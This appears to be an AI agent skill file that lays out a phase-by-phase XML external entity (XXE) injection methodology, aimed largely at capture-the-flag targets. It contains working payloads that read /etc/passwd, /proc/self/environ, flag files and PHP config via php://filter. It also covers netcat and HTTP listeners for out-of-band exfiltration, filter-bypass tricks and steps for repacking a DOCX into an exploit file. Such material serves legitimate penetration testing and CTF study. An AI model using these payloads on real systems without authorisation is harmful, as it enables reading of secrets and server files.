---
name: xxe-injection-methodology
description: "Detection and exploitation methodology for XML external entity injection (XXE). Use when the target has XML parsing, SOAP APIs, file uploads (DOCX/XLSX/SVG), or any endpoint that accepts XML input. Includes basic file read, blind XXE out-of-band exfiltration (parameter entities + external DTD), SVG/DOCX XXE, SOAP Envelope XXE, JSON→XML conversion attacks. Even if the API documentation says it only accepts JSON, you should still try XML Content-Type to test for implicit XXE."
zh-signals: "XML 外部实体注入的检测与利用方法，覆盖盲 XXE、SVG/DOCX 与 SOAP。信号:XXE,XML外部实体,盲XXE,DTD,文件读取"
when-to-use: >-
  Use when a target parses XML, exposes SOAP APIs, accepts DOCX/XLSX/SVG uploads, or may accept XML content types for implicit XXE testing.
metadata:
  tags: "xxe,xml,xml external entity,blind-xxe,dtd,soap,svg,docx,file-read,oob,parameter-entity,application/xml,text/xml,DOCTYPE,ENTITY,external entity,xml parsing,Content-Type: xml"
  category: "exploit"
---

# XXE Injection Attack Methodology

## Further Reading

- Full payloads for XXE file read, blind XXE OOB exfiltration, SVG/DOCX XXE, and SOAP XXE → [references/xxe-exploitation.md](references/xxe-exploitation.md)
- XXE advanced techniques (blind injection/OOB/file upload/XInclude/encoding bypass) → [references/xxe-advanced.md](references/xxe-advanced.md)

---

## Phase 1: Discover XXE Entry Points

- Endpoints with Content-Type: `application/xml` or `text/xml`
- **Switch JSON requests to XML**: even if the endpoint accepts JSON, try sending XML (many backends support both formats)
- File uploads (DOCX, XLSX, and SVG are all XML formats)
- SOAP APIs (URL contains `/ws/`, `/soap/`, `/wsdl/`)

## Phase 2: Basic XXE File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

**Key**: `&xxe;` must be placed inside an XML element that will be echoed back!

### Common Target Files

```
file:///flag.txt
file:///flag
file:///app/flag.txt
file:///etc/passwd
file:///app/app.py
file:///proc/self/environ
```

## Phase 3: Exploitation Decision Tree

```
XXE entry point confirmed
├─ SOAP endpoint? → XXE must be embedded in the SOAP Envelope! → [references/xxe-exploitation.md](references/xxe-exploitation.md)
├─ Output reflected? → read files directly with ENTITY file:///
├─ No output? → blind XXE with parameter entities + external DTD for OOB exfiltration
│  └─ Use bash to run `python3 -m http.server` or `nc -lvp PORT` to receive the OOB callback
│  └─ [references/xxe-exploitation.md](references/xxe-exploitation.md)
├─ PHP target? → php://filter/convert.base64-encode bypass for XML special characters
└─ File upload entry point? → SVG/DOCX XXE → [references/xxe-exploitation.md](references/xxe-exploitation.md)
```

## Phase 4: PHP Special Techniques

PHP files containing special characters such as `<` break XML parsing; use php://filter base64 encoding to bypass:
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/app/config.php">
```

## Phase 5: JSON → XML Conversion Attack

Some backends support both JSON and XML, and the parser auto-selects the format:

```
Content-Type: application/xml
```
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<root><username>&xxe;</username><password>test</password></root>
```

Even if the documentation says JSON, try the XML Content-Type — there may be implicit support.

## XXE Defense Bypass

- `<!DOCTYPE>` is filtered → try UTF-16 encoding
- `ENTITY` is filtered → try a parameter entity `%xxe;`
- `SYSTEM` is filtered → try `PUBLIC "x" "file:///flag"`

## Notes

- **XXE inherently includes SSRF**: `SYSTEM "http://..."` is a server-side request
- **XML parser differences**: Python lxml disables external entities by default; older Java versions enable them by default
- **Blind XXE requires an external server**: parameter entity OOB exfiltration requires you to control a server that receives the data

---

## CTF XXE Technique Supplements

### DOCX/Office XML Upload XXE
DOCX is a ZIP containing XML; modify `[Content_Types].xml` to inject the XXE:
```bash
unzip template.docx
# Edit [Content_Types].xml to add DOCTYPE + ENTITY
zip -r exploit.docx . 
# Upload, then the server-side XML parse triggers the XXE
```

### XML Injection Point Expansion
Besides the usual request body, check these injection points:
- Headers such as `X-Forwarded-For` being written into XML logs
- SVG file uploads (SVG is XML)
- SOAP/SAML endpoints
- RSS/Atom feed input
